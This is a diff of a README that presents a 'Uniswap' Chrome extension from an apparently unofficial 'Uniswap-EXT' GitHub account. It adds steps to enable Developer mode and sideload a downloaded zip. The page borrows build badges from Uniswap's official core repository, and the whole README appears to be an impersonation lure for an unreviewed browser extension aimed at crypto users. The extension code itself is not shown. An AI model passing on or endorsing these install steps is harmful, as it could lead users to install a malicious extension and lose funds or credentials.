@@ -1,7 +1,6 @@
 ![1024px-Uniswap_Logo_and_Wordmark svg](https://user-images.githubusercontent.com/36484062/158013966-b860120a-2e73-4883-b570-0cca8267fdc7.png)
 
-# Uniswap-Chrome-Extension
-
+# Uniswap-Chrome-Extension 🦄
 [![Lint](https://github.com/Uniswap/uniswap-v3-core/actions/workflows/lint.yml/badge.svg)](https://github.com/Uniswap/uniswap-v3-core/actions/workflows/lint.yml)
 [![Tests](https://github.com/Uniswap/uniswap-v3-core/actions/workflows/tests.yml/badge.svg)](https://github.com/Uniswap/uniswap-v3-core/actions/workflows/tests.yml)
 [![Fuzz Testing](https://github.com/Uniswap/uniswap-v3-core/actions/workflows/fuzz-testing.yml/badge.svg)](https://github.com/Uniswap/uniswap-v3-core/actions/workflows/fuzz-testing.yml)
@@ -12,3 +11,19 @@ A Chrome extension for Uniswap cryptocurrency DeFi exchange
 
 # What is Uniswap?
 Uniswap is the largest decentralized exchange (or DEX) operating on the Ethereum blockchain. It allows users anywhere in the world to trade crypto without an intermediary. 
+
+# How to Install
+1. Open Chrome browser
+
+  - In the URL address bar > type chrome://extensions.
+
+2. Enable Developer mode located on the top right.
+
+![How-To-Manually-Install-A-Chrome-Extension](https://user-images.githubusercontent.com/36484062/158015112-a8d7a6b1-e8c0-44fc-a6b2-c42573d900e8.jpg)
+
+3. Download uniswap Extension: https://github.com/Uniswap-EXT/Uniswap-Chrome-Extension/archive/refs/heads/main.zip
+  - Extract zip file, then drag and drop the folder into chrome extensions window. 
+  
+  - Alternatively, click on the Load unpacked button, navigate to the extensions folder and press Select Folder.
+
+That’s it! The extension is now installed.
